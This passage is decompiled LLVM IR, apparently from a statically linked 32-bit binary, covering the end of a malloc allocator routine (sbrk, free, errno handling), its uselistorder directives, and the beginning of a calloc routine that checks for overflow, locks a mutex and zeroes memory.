  store i32 %v1_8052c0d, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052c4a

dec_label_pc_8052c16:                             ; preds = %dec_label_pc_8052bd7
  %v1_8052c16 = load i32, i32* @ebx, align 4
  %v7_8052c16 = icmp ult i32 %v1_8052bf9, %v1_8052c16
  %v1_8052c18 = icmp eq i1 %v7_8052c16, false
  br i1 %v1_8052c18, label %dec_label_pc_8052c4f, label %dec_label_pc_8052c1a

dec_label_pc_8052c1a:                             ; preds = %dec_label_pc_8052c16
  %v0_8052c1a = load i8, i8* @global_var_80679e0.252, align 1
  %v2_8052c1a = and i8 %v0_8052c1a, -2
  store i8 %v2_8052c1a, i8* @global_var_80679e0.252, align 32
  store i32 %v2_8052bd7, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052c2e

dec_label_pc_8052c27:                             ; preds = %dec_label_pc_8052ba9
  %v10_8052c27 = icmp eq i32 %v0_8052c27, -1
  br i1 %v10_8052c27, label %dec_label_pc_8052c32, label %dec_label_pc_8052c2c

dec_label_pc_8052c2c:                             ; preds = %dec_label_pc_8052c27
  store i32 %v0_8052c35, i32* @edi, align 4
  br label %dec_label_pc_8052c2e

dec_label_pc_8052c2e:                             ; preds = %dec_label_pc_8052c1a, %dec_label_pc_8052c2c
  %v0_8052c4f49 = phi i32 [ %v2_8052bd7, %dec_label_pc_8052c1a ], [ %v0_8052c27, %dec_label_pc_8052c2c ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8052c4f

dec_label_pc_8052c32:                             ; preds = %dec_label_pc_8052c27
  store i32 %v0_8052c35, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8052c39 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8052c39, i32* %edx.global-to-local, align 4
  %v1_8052c40 = load i32, i32* @ebx, align 4
  %v2_8052c40 = sub i32 %v1_8052c39, %v1_8052c40
  %v1_8052c42 = load i32, i32* @esi, align 4
  %v2_8052c42 = sub i32 %v2_8052c40, %v1_8052c42
  store i32 %v2_8052c42, i32* %eax.global-to-local, align 4
  %v0_8052c44 = load i32, i32* @global_var_80679e8.249, align 8
  %v2_8052c44 = add i32 %v0_8052c44, %v2_8052c42
  store i32 %v2_8052c44, i32* @global_var_80679e8.249, align 8
  br label %dec_label_pc_8052c4a

dec_label_pc_8052c4a:                             ; preds = %dec_label_pc_8052c08, %dec_label_pc_8052c32
  %v0_8052c4f48 = phi i32 [ %v1_8052c0d, %dec_label_pc_8052c08 ], [ %v1_8052c39, %dec_label_pc_8052c32 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8052c4f

dec_label_pc_8052c4f:                             ; preds = %dec_label_pc_8052c16, %dec_label_pc_8052c2e, %dec_label_pc_8052c4a
  %v0_8052c54 = phi i32 [ %v1_8052bf9, %dec_label_pc_8052c16 ], [ %v0_8052c4f49, %dec_label_pc_8052c2e ], [ %v0_8052c4f48, %dec_label_pc_8052c4a ]
  %v10_8052c4f = icmp eq i32 %v0_8052c54, -1
  br i1 %v10_8052c4f, label %dec_label_pc_8052cbd, label %dec_label_pc_8052c54

dec_label_pc_8052c54:                             ; preds = %dec_label_pc_8052c4f
  %v1_8052c54 = load i32, i32* @edi, align 4
  %v2_8052c54 = sub i32 %v0_8052c54, %v1_8052c54
  store i32 %v2_8052c54, i32* %edx.global-to-local, align 4
  store i32 %v1_8052c54, i32* @global_var_80676ac.237, align 4
  %v1_8052c5c = load i32, i32* @esi, align 4
  %v2_8052c5c = add i32 %v1_8052c5c, %v2_8052c54
  %v1_8052c5f = or i32 %v2_8052c5c, 1
  store i32 %v1_8052c5f, i32* %eax.global-to-local, align 4
  %v2_8052c62 = add i32 %v1_8052c54, 4
  %v3_8052c62 = inttoptr i32 %v2_8052c62 to i32*
  store i32 %v1_8052c5f, i32* %v3_8052c62, align 4
  %v0_8052c65 = load i32, i32* @global_var_80679e8.249, align 8
  %v1_8052c65 = load i32, i32* @esi, align 4
  %v2_8052c65 = add i32 %v1_8052c65, %v0_8052c65
  store i32 %v2_8052c65, i32* @global_var_80679e8.249, align 8
  br i1 %v2_8052acc, label %dec_label_pc_8052cbd, label %dec_label_pc_8052c6f

dec_label_pc_8052c6f:                             ; preds = %dec_label_pc_8052c54
  %v1_8052c6f = add i32 %v1_8052acc, -12
  store i32 %v0_8052ab9, i32* @ecx, align 4
  %v1_8052c76 = and i32 %v1_8052c6f, -8
  store i32 %v1_8052c76, i32* %eax.global-to-local, align 4
  %v1_8052c7b = or i32 %v1_8052c76, 1
  store i32 %v1_8052c7b, i32* %edx.global-to-local, align 4
  %v5_8052c7e = icmp ult i32 %v1_8052c76, 15
  store i32 %v1_8052c7b, i32* %v2_8052ac2, align 4
  %v0_8052c84 = load i32, i32* @ecx, align 4
  %v1_8052c84 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052c84 = add i32 %v0_8052c84, 4
  %v3_8052c84 = add i32 %v2_8052c84, %v1_8052c84
  %v4_8052c84 = inttoptr i32 %v3_8052c84 to i32*
  store i32 5, i32* %v4_8052c84, align 4
  %v0_8052c8c = load i32, i32* @ecx, align 4
  %v1_8052c8c = load i32, i32* %eax.global-to-local, align 4
  %v2_8052c8c = add i32 %v0_8052c8c, 8
  %v3_8052c8c = add i32 %v2_8052c8c, %v1_8052c8c
  %v4_8052c8c = inttoptr i32 %v3_8052c8c to i32*
  store i32 5, i32* %v4_8052c8c, align 4
  br i1 %v5_8052c7e, label %dec_label_pc_8052cbd, label %dec_label_pc_8052c96

dec_label_pc_8052c96:                             ; preds = %dec_label_pc_8052c6f
  %v0_8052c99 = load i32, i32* @ecx, align 4
  %v1_8052c9b = add i32 %v0_8052c99, 8
  store i32 %v1_8052c9b, i32* %eax.global-to-local, align 4
  %v0_8052c9e = load i32, i32* @global_var_80679c4.253, align 4
  store i32 %v0_8052c9e, i32* @ebx, align 4
  store i32 %v1_8052c9b, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_80679c4.253, align 4
  %v1_8052caf = call i32 @free(i32 %v1_8052c9b)
  store i32 %v1_8052caf, i32* %eax.global-to-local, align 4
  %v0_8052cb4 = load i32, i32* @ebx, align 4
  store i32 %v0_8052cb4, i32* @global_var_80679c4.253, align 4
  br label %dec_label_pc_8052cbd

dec_label_pc_8052cbd:                             ; preds = %dec_label_pc_8052c6f, %dec_label_pc_8052c54, %dec_label_pc_8052c4f, %dec_label_pc_8052b7e, %dec_label_pc_8052c96
  %v0_8052cbd = load i32, i32* @global_var_80679e8.249, align 8
  store i32 %v0_8052cbd, i32* %eax.global-to-local, align 4
  %v1_8052cc2 = load i32, i32* @global_var_80679ec.254, align 4
  %tmp138 = icmp ugt i32 %v0_8052cbd, %v1_8052cc2
  br i1 %tmp138, label %dec_label_pc_8052cca, label %dec_label_pc_8052ccf

dec_label_pc_8052cca:                             ; preds = %dec_label_pc_8052cbd
  store i32 %v0_8052cbd, i32* @global_var_80679ec.254, align 4
  br label %dec_label_pc_8052ccf

dec_label_pc_8052ccf:                             ; preds = %dec_label_pc_8052cbd, %dec_label_pc_8052cca
  %v1_8052ccf = load i32, i32* @global_var_80679e4.247, align 4
  %v2_8052ccf = add i32 %v1_8052ccf, %v0_8052cbd
  store i32 %v2_8052ccf, i32* %eax.global-to-local, align 4
  %v1_8052cd5 = load i32, i32* @global_var_80679f4.250, align 4
  %tmp139 = icmp ugt i32 %v2_8052ccf, %v1_8052cd5
  br i1 %tmp139, label %dec_label_pc_8052cdd, label %dec_label_pc_8052ce2

dec_label_pc_8052cdd:                             ; preds = %dec_label_pc_8052ccf
  store i32 %v2_8052ccf, i32* @global_var_80679f4.250, align 4
  br label %dec_label_pc_8052ce2

dec_label_pc_8052ce2:                             ; preds = %dec_label_pc_8052ccf, %dec_label_pc_8052cdd
  %v0_8052ce2 = load i32, i32* @global_var_80676ac.237, align 4
  store i32 %v0_8052ce2, i32* @ebx, align 4
  %v1_8052ce8 = add i32 %v0_8052ce2, 4
  %v2_8052ce8 = inttoptr i32 %v1_8052ce8 to i32*
  %v3_8052ce8 = load i32, i32* %v2_8052ce8, align 4
  %v1_8052ceb = and i32 %v3_8052ce8, -4
  store i32 %v1_8052ceb, i32* @ecx, align 4
  %v10_8052cee = icmp ult i32 %v1_8052ceb, %v1_805298b
  br i1 %v10_8052cee, label %dec_label_pc_8052d6e, label %dec_label_pc_8052cf4

dec_label_pc_8052cf4:                             ; preds = %dec_label_pc_8052ce2
  store i32 %v1_8052a16, i32* %esi.global-to-local, align 4
  %v2_8052cfa = sub i32 %v1_8052ceb, %v1_8052a16
  store i32 %v2_8052cfa, i32* %ecx.global-to-local, align 4
  %v2_8052cfc = add i32 %v0_8052ce2, %v1_8052a16
  store i32 %v2_8052cfc, i32* %edx.global-to-local, align 4
  %v1_8052cff = or i32 %v1_8052a16, 1
  store i32 %v1_8052cff, i32* %eax.global-to-local, align 4
  store i32 %v2_8052cfc, i32* @global_var_80676ac.237, align 4
  store i32 %v1_8052cff, i32* %v2_8052ce8, align 4
  %v0_8052d0b.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052d0b

dec_label_pc_8052d0b:                             ; preds = %dec_label_pc_805299c, %dec_label_pc_8052cf4
  %v0_8052d0b = phi i32 [ %v5_80529af, %dec_label_pc_805299c ], [ %v0_8052d0b.pre, %dec_label_pc_8052cf4 ]
  %v1_8052d0b = or i32 %v0_8052d0b, 1
  store i32 %v1_8052d0b, i32* @ecx, align 4
  %v0_8052d0e = load i32, i32* @ebx, align 4
  %v1_8052d0e = add i32 %v0_8052d0e, 8
  store i32 %v1_8052d0e, i32* @ebx, align 4
  %v1_8052d11 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052d11 = add i32 %v1_8052d11, 4
  %v3_8052d11 = inttoptr i32 %v2_8052d11 to i32*
  store i32 %v1_8052d0b, i32* %v3_8052d11, align 4
  br label %dec_label_pc_8052d7b

dec_label_pc_8052d16:                             ; preds = %dec_label_pc_8052756
  %v5_8052d1c = sub i32 %v1_8052739, %v1_8052a16
  store i32 %v5_8052d1c, i32* %eax.global-to-local, align 4
  %v2_8052d20 = add i32 %v0_8052804113, %v1_8052a16
  store i32 %v2_8052d20, i32* %edx.global-to-local, align 4
  %v1_8052d24 = or i32 %v1_8052a16, 1
  store i32 %v2_8052d20, i32* @global_var_80676b0.238, align 16
  store i32 %v1_8052d24, i32* %v2_8052733, align 4
  %v0_8052d30 = load i32, i32* %eax.global-to-local, align 4
  %v0_8052d32 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8052d32, i32* @global_var_80676bc.255, align 4
  %v1_8052d38 = or i32 %v0_8052d30, 1
  store i32 %v1_8052d38, i32* @ecx, align 4
  store i32 %v0_8052d32, i32* @global_var_80676c0.240, align 64
  %v1_8052d41 = add i32 %v0_8052d32, 8
  %v2_8052d41 = inttoptr i32 %v1_8052d41 to i32*
  store i32 ptrtoint (i32* @global_var_80676b4.239 to i32), i32* %v2_8052d41, align 4
  %v0_8052d48 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052d48 = add i32 %v0_8052d48, 12
  %v2_8052d48 = inttoptr i32 %v1_8052d48 to i32*
  store i32 ptrtoint (i32* @global_var_80676b4.239 to i32), i32* %v2_8052d48, align 4
  %v0_8052d4f = load i32, i32* @ecx, align 4
  %v1_8052d4f = load i32, i32* %edx.global-to-local, align 4
  %v2_8052d4f = add i32 %v1_8052d4f, 4
  %v3_8052d4f = inttoptr i32 %v2_8052d4f to i32*
  store i32 %v0_8052d4f, i32* %v3_8052d4f, align 4
  %v0_8052d52 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052d52 = load i32, i32* %edx.global-to-local, align 4
  %v3_8052d52 = add i32 %v1_8052d52, %v0_8052d52
  %v4_8052d52 = inttoptr i32 %v3_8052d52 to i32*
  store i32 %v0_8052d52, i32* %v4_8052d52, align 4
  br label %dec_label_pc_8052d60

dec_label_pc_8052d57:                             ; preds = %dec_label_pc_8052765
  store i32 %v1_8052a16, i32* %ebx.global-to-local, align 4
  %v0_8052d5b = load i32, i32* @ebp, align 4
  %v2_8052d5b = or i32 %v1_8052a16, 4
  %v3_8052d5b = add i32 %v0_8052d5b, %v2_8052d5b
  %v4_8052d5b = inttoptr i32 %v3_8052d5b to i32*
  %v5_8052d5b = load i32, i32* %v4_8052d5b, align 4
  %v6_8052d5b = or i32 %v5_8052d5b, 1
  store i32 %v6_8052d5b, i32* %v4_8052d5b, align 4
  br label %dec_label_pc_8052d60

dec_label_pc_8052d60:                             ; preds = %dec_label_pc_8052d16, %dec_label_pc_8052d57
  %v0_8052d60 = load i32, i32* @ebp, align 4
  %v1_8052d60 = add i32 %v0_8052d60, 8
  store i32 %v1_8052d60, i32* @ebx, align 4
  br label %dec_label_pc_8052d7b

dec_label_pc_8052d65:                             ; preds = %dec_label_pc_8052855
  %v1_8052d65 = load i32, i32* @ebx, align 4
  %v2_8052d65 = add i32 %v0_8052864, 4
  %v3_8052d65 = add i32 %v2_8052d65, %v1_8052d65
  %v4_8052d65 = inttoptr i32 %v3_8052d65 to i32*
  %v5_8052d65 = load i32, i32* %v4_8052d65, align 4
  %v6_8052d65 = or i32 %v5_8052d65, 1
  store i32 %v6_8052d65, i32* %v4_8052d65, align 4
  br label %dec_label_pc_8052d6a

dec_label_pc_8052d6a:                             ; preds = %dec_label_pc_805286d, %dec_label_pc_8052d65
  %v0_8052d6a = load i32, i32* @ecx, align 4
  store i32 %v0_8052d6a, i32* @ebx, align 4
  br label %dec_label_pc_8052d7b

dec_label_pc_8052d6e:                             ; preds = %dec_label_pc_8052b2c, %dec_label_pc_8052ce2, %dec_label_pc_8052b60, %dec_label_pc_8052b36
  %v0_8052d6e = load i32, i32* %stack_var_-92, align 4
  %v1_8052d6e = call i32 @__errno_location(i32 %v0_8052d6e)
  store i32 %v1_8052d6e, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8052d75 = inttoptr i32 %v1_8052d6e to i32*
  store i32 12, i32* %v1_8052d75, align 4
  br label %dec_label_pc_8052d7b

dec_label_pc_8052d7b:                             ; preds = %dec_label_pc_8052d6a, %dec_label_pc_8052d60, %dec_label_pc_8052d0b, %dec_label_pc_80529c7, %dec_label_pc_8052979, %dec_label_pc_8052700, %dec_label_pc_8052d6e
  store i32 %v2_8052637, i32* %eax.global-to-local, align 4
  store i32 %v2_8052637, i32* %stack_var_-92, align 4
  %v3_8052d84 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v3_8052d84, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d8c

dec_label_pc_8052d8c:                             ; preds = %dec_label_pc_8052655, %dec_label_pc_8052d7b
  %v0_8052d8f = load i32, i32* @ebx, align 4
  store i32 %v0_8052d8f, i32* %eax.global-to-local, align 4
  %v2_8052d91 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8052d91, i32* @ebx, align 4
  store i32 %v0_8052624, i32* @esi, align 4
  store i32 %v0_8052623, i32* @edi, align 4
  store i32 %v0_8052622, i32* @ebp, align 4
  ret i32 %v0_8052d8f

; uselistorder directives
  uselistorder i32 %v0_8052d52, { 1, 0 }
  uselistorder i32 %v0_8052d32, { 1, 0, 2 }
  uselistorder i32 %v2_8052ccf, { 1, 0, 2 }
  uselistorder i32 %v0_8052cbd, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8052c54, { 1, 0 }
  uselistorder i32 %v2_8052c42, { 1, 0 }
  uselistorder i32 %v1_8052bf9, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_8052be3, { 1, 0, 2 }
  uselistorder i32 %v2_8052bd7, { 1, 2, 0 }
  uselistorder i32 %v2_8052bd2, { 1, 0, 2 }
  uselistorder i32 %v1_8052bc2, { 2, 1, 0 }
  uselistorder i8 %v0_8052b90, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_8052b73, { 1, 0, 2 }
  uselistorder i32 %v0_8052c35, { 4, 5, 2, 3, 6, 1, 8, 7, 0 }
  uselistorder i32 %v0_8052c27, { 2, 0, 1 }
  uselistorder i32 %v8_8052b43, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_8052b40, { 1, 0 }
  uselistorder i32 %v0_8052b1f, { 1, 0 }
  uselistorder i32 %v1_8052af8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8052af0, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8052ae8, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_8052ad5, { 1, 0 }
  uselistorder i32 %v1_8052acc, { 4, 0, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v0_8052ab9, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_8052a9d, { 1, 0, 2 }
  uselistorder i32 %v2_8052a89, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_8052a52, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8052a46, { 2, 1, 0 }
  uselistorder i32 %v8_8052a35, { 4, 2, 1, 0, 3, 5 }
  uselistorder i32 %v2_8052a1c, { 1, 0, 2 }
  uselistorder i32 %v0_80529b8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_805298b, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8052981, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_8052973, { 1, 0 }
  uselistorder i32 %v1_805290a, { 1, 0 }
  uselistorder i32 %v3_80528fe, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_805290e, { 1, 0 }
  uselistorder i32 %v2_80528f8, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_80528f512, { 1, 0 }
  uselistorder i32 %v2_80528ea, { 1, 0 }
  uselistorder i32 %v1_80528ce, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_80528ca, { 2, 1, 0 }
  uselistorder i32 %v1_80528c6, { 1, 0 }
  uselistorder i32 %v1_80528ba, { 2, 1, 0 }
  uselistorder i32 %v2_80528b0, { 1, 0 }
  uselistorder i32 %v1_80528ad, { 1, 2, 0 }
  uselistorder i32 %v4_805284b, { 0, 6, 4, 5, 3, 2, 1 }
  uselistorder i32 %v0_8052896, { 1, 0 }
  uselistorder i32 %v0_8052864, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8052837, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8052804, { 1, 2, 0 }
  uselistorder i32 %v2_80527e8, { 1, 0 }
  uselistorder i32 %v1_80527de, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_80527d9.lcssa, { 1, 0 }
  uselistorder i32 %v3_80527c9, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_80527c0, { 1, 0, 2 }
  uselistorder i32 %v3_80527a3, { 5, 1, 2, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_805279c, { 1, 0, 2 }
  uselistorder i32 %v2_8052784, { 2, 1, 0 }
  uselistorder i32 %v0_8052770, { 2, 1, 3, 0 }
  uselistorder i32 %v3_8052736, { 1, 0, 2 }
  uselistorder i32 %v0_8052804113, { 1, 0, 2, 3 }
  uselistorder i32 %v3_80526e3, { 1, 0, 2 }
  uselistorder i32 %v2_80526d5, { 2, 1, 0 }
  uselistorder i32 %v2_80526b0, { 2, 1, 0 }
  uselistorder i8 %v0_805267e, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_8052a16, { 13, 31, 11, 5, 29, 12, 6, 22, 21, 2, 1, 7, 24, 23, 20, 18, 19, 8, 25, 26, 9, 27, 28, 15, 10, 16, 17, 0, 30, 14, 3, 32, 34, 33, 4, 35 }
  uselistorder i32 %v1_8052667, { 0, 2, 1 }
  uselistorder i32 %v0_8052650, { 1, 0 }
  uselistorder i32* %stack_var_-92, { 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 1, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 20, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 22, 21, 23, 24, 28, 25, 26, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 51, 49, 50, 52 }
  uselistorder i32* %ebx.global-to-local, { 2, 3, 7, 4, 1, 5, 6, 8, 9, 10, 11, 0, 12, 13 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 56, 51, 52, 55, 54, 53, 57, 58, 59, 60, 61, 63, 62, 64, 65, 66, 67, 68, 69, 70, 71, 0, 72, 73, 74, 75 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_80679e0.252, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0, 4, 3, 2 }
  uselistorder i32 134641332, { 2, 3, 1, 0 }
  uselistorder i32* @global_var_80676c0.240, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_80676ac.237 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_80676ac.237 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_8052d8c, { 1, 0 }
  uselistorder label %dec_label_pc_8052d7b, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8052d6e, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8052d6a, { 1, 0 }
  uselistorder label %dec_label_pc_8052d60, { 1, 0 }
  uselistorder label %dec_label_pc_8052d0b, { 1, 0 }
  uselistorder label %dec_label_pc_8052ce2, { 1, 0 }
  uselistorder label %dec_label_pc_8052ccf, { 1, 0 }
  uselistorder label %dec_label_pc_8052cbd, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8052c4f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052c4a, { 1, 0 }
  uselistorder label %dec_label_pc_8052c2e, { 1, 0 }
  uselistorder label %dec_label_pc_8052bd7, { 1, 0 }
  uselistorder label %dec_label_pc_8052bc0, { 1, 0 }
  uselistorder label %dec_label_pc_8052ba9, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8052b60, { 1, 0 }
  uselistorder label %dec_label_pc_8052b2c, { 1, 0 }
  uselistorder label %dec_label_pc_8052b1f, { 1, 0 }
  uselistorder label %dec_label_pc_8052ae0, { 1, 0 }
  uselistorder label %dec_label_pc_8052ab9, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8052a9d, { 1, 0 }
  uselistorder label %dec_label_pc_8052a84, { 1, 0 }
  uselistorder label %dec_label_pc_8052a66, { 1, 0 }
  uselistorder label %dec_label_pc_8052981, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052979, { 1, 0 }
  uselistorder label %dec_label_pc_8052962, { 1, 0 }
  uselistorder label %dec_label_pc_80528f5, { 1, 0 }
  uselistorder label %dec_label_pc_80528fa.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80528ce, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052855, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %dec_label_pc_80527dc, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80527c5, { 1, 0 }
  uselistorder label %dec_label_pc_8052733, { 1, 0 }
  uselistorder label %dec_label_pc_8052804.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052700, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_805267e, { 1, 0 }
}

define i32 @calloc(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_8052d98 = load i32, i32* @edi, align 4
  %v0_8052d9a = load i32, i32* @ebx, align 4
  %v12_8052d9b = ptrtoint i32* %stack_var_-28 to i32
  %v4_8052d9e = trunc i64 %arg1 to i32
  store i32 %arg2, i32* @ecx, align 4
  %sext = mul i64 %arg1, 4294967296
  %v2_8052da8 = sdiv i64 %sext, 4294967296
  %v3_8052da8 = sext i32 %arg2 to i64
  %v4_8052da8 = mul nsw i64 %v3_8052da8, %v2_8052da8
  %v5_8052da8 = trunc i64 %v4_8052da8 to i32
  store i32 %v5_8052da8, i32* @ebx, align 4
  %v2_8052dab = icmp eq i32 %v4_8052d9e, 0
  br i1 %v2_8052dab, label %dec_label_pc_8052dcd, label %dec_label_pc_8052daf

dec_label_pc_8052daf:                             ; preds = %entry
  store i32 %v4_8052d9e, i32* @edi, align 4
  %div = udiv i32 %v5_8052da8, %v4_8052d9e
  store i32 %div, i32* %eax.global-to-local, align 4
  %v12_8052db7 = icmp eq i32 %div, %arg2
  br i1 %v12_8052db7, label %dec_label_pc_8052dcd, label %dec_label_pc_8052dbb

dec_label_pc_8052dbb:                             ; preds = %dec_label_pc_8052daf
  %v1_8052dbb = call i32 @__errno_location(i32 %v0_8052d9a)
  store i32 %v1_8052dbb, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8052dc2 = inttoptr i32 %v1_8052dbb to i32*
  store i32 12, i32* %v1_8052dc2, align 4
  br label %dec_label_pc_8052e83

dec_label_pc_8052dcd:                             ; preds = %dec_label_pc_8052daf, %entry
  store i32 %v12_8052d9b, i32* %eax.global-to-local, align 4
  %v4_8052ddd = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134540701, i32 ptrtoint (i32* @global_var_8062910.167 to i32))
  store i32 %v4_8052ddd, i32* %eax.global-to-local, align 4
  %v1_8052de9 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062910.167 to i32))
  store i32 %v1_8052de9, i32* %eax.global-to-local, align 4
  %v0_8052dee = load i32, i32* @ebx, align 4
  %v1_8052df1 = call i32 @malloc(i32 %v0_8052dee)
  store i32 %v1_8052df1, i32* %eax.global-to-local, align 4
  store i32 %v1_8052df1, i32* @ebx, align 4
  %v1_8052dfb = icmp eq i32 %v1_8052df1, 0
  br i1 %v1_8052dfb, label %dec_label_pc_8052e72, label %dec_label_pc_8052dff

dec_label_pc_8052dff:                             ; preds = %dec_label_pc_8052dcd
  %v1_8052dff = add i32 %v1_8052df1, -4
  %v2_8052dff = inttoptr i32 %v1_8052dff to i32*
  %v3_8052dff = load i32, i32* %v2_8052dff, align 4
  store i32 %v3_8052dff, i32* %eax.global-to-local, align 4
  %v2_8052e02 = and i32 %v3_8052dff, 2
  %v3_8052e02 = icmp eq i32 %v2_8052e02, 0
  %v1_8052e04 = icmp eq i1 %v3_8052e02, false
  br i1 %v1_8052e04, label %dec_label_pc_8052e72, label %dec_label_pc_8052e06

dec_label_pc_8052e06:                             ; preds = %dec_label_pc_8052dff
  %v1_8052e063 = add i32 %v3_8052dff, -4
  %v1_8052e09 = and i32 %v1_8052e063, -4
  %v2_8052e0e = udiv i32 %v1_8052e09, 4
  store i32 %v2_8052e0e, i32* %eax.global-to-local, align 4
  %v5_8052e11 = icmp ult i32 %v1_8052e09, 36
  %tmp = and i32 %v1_8052e063, -4
  %tmp18 = icmp eq i32 %tmp, 36
  %v2_8052e14 = or i1 %v5_8052e11, %tmp18
  br i1 %v2_8052e14, label %dec_label_pc_8052e25, label %dec_label_pc_8052e16

dec_label_pc_8052e16:                             ; preds = %dec_label_pc_8052e06
  %v3_8052e1b = inttoptr i32 %v1_8052df1 to i8*
  %v4_8052e1b = call i32 @__GI_memset(i8* %v3_8052e1b, i32 0, i32 %v1_8052e09)
  store i32 %v4_8052e1b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052e72

dec_label_pc_8052e25:                             ; preds = %dec_label_pc_8052e06
  %v1_8052e25 = inttoptr i32 %v1_8052df1 to i32*
  store i32 0, i32* %v1_8052e25, align 4
  %v0_8052e2b = load i32, i32* @ebx, align 4
  %v1_8052e2b = add i32 %v0_8052e2b, 4
  %v2_8052e2b = inttoptr i32 %v1_8052e2b to i32*
  store i32 0, i32* %v2_8052e2b, align 4
  %v0_8052e32 = load i32, i32* @ebx, align 4
  %v1_8052e32 = add i32 %v0_8052e32, 8
  %v2_8052e32 = inttoptr i32 %v1_8052e32 to i32*
  store i32 0, i32* %v2_8052e32, align 4
  %v0_8052e39 = load i32, i32* %eax.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_8052e39, 5
  br i1 %tmp15, label %dec_label_pc_8052e72, label %dec_label_pc_8052e3e

dec_label_pc_8052e3e:                             ; preds = %dec_label_pc_8052e25
  %v0_8052e3e = load i32, i32* @ebx, align 4
  %v1_8052e3e = add i32 %v0_8052e3e, 12
  %v2_8052e3e = inttoptr i32 %v1_8052e3e to i32*
  store i32 0, i32* %v2_8052e3e, align 4
  %v0_8052e45 = load i32, i32* @ebx, align 4
  %v1_8052e45 = add i32 %v0_8052e45, 16
  %v2_8052e45 = inttoptr i32 %v1_8052e45 to i32*
  store i32 0, i32* %v2_8052e45, align 4
  %v0_8052e4c = load i32, i32* %eax.global-to-local, align 4
